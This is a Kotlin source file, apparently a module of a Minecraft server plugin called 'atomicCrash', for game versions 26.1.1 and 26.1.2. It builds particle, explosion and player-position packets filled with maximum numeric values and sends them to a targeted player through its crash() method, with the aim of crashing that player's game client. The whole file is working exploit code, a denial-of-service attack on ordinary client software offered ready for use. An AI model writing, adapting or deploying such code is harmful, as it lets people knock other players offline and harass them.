@file:Suppress("PackageName", "ClassName")

package io.github.runkang10.atomicCrash.modules

import io.github.runkang10.atomicCrash.shared.Module
import io.github.runkang10.atomicCrash.shared.ModuleHeader
import net.minecraft.core.particles.ParticleTypes
import net.minecraft.network.protocol.game.ClientboundExplodePacket
import net.minecraft.network.protocol.game.ClientboundLevelParticlesPacket
import net.minecraft.network.protocol.game.ClientboundPlayerPositionPacket
import net.minecraft.sounds.SoundEvents
import net.minecraft.util.random.WeightedList
import net.minecraft.world.entity.PositionMoveRotation
import net.minecraft.world.phys.Vec3
import org.bukkit.craftbukkit.entity.CraftPlayer
import org.bukkit.entity.Player
import java.util.*

class NMS_26_1 : Module {
    companion object : ModuleHeader {
        private const val MAX_INT = Int.MAX_VALUE
        private const val MAX_DOUBLE = Double.MAX_VALUE
        private const val MAX_FLOAT = Float.MAX_VALUE
        private val MAX_VEC3 = Vec3(MAX_DOUBLE, MAX_DOUBLE, MAX_DOUBLE)


        override val supportedVersion = arrayOf("26.1.1", "26.1.2")

        override fun new(): Module = NMS_26_1()
    }

    private val particlePacket
        get() = ClientboundLevelParticlesPacket(
            ParticleTypes.ASH,
            true,
            true,
            MAX_DOUBLE,
            MAX_DOUBLE,
            MAX_DOUBLE,
            MAX_FLOAT,
            MAX_FLOAT,
            MAX_FLOAT,
            MAX_FLOAT,
            MAX_INT
        )
    private val explodePacket
        get() = ClientboundExplodePacket(
            MAX_VEC3,
            MAX_FLOAT,
            MAX_INT,
            Optional.of(MAX_VEC3),
            ParticleTypes.EXPLOSION,
            SoundEvents.GENERIC_EXPLODE,
            WeightedList.of()
        )
    private val positionPacket
        get() = ClientboundPlayerPositionPacket(
            0,
            PositionMoveRotation(MAX_VEC3, MAX_VEC3, MAX_FLOAT, MAX_FLOAT),
            emptySet()
        )
    private val packets get() = listOf(particlePacket, explodePacket, positionPacket)

    override fun crash(player: Player) {
        val serverPlayer = (player as CraftPlayer).handle
        packets.forEach { serverPlayer.connection.send(it) }
    }
}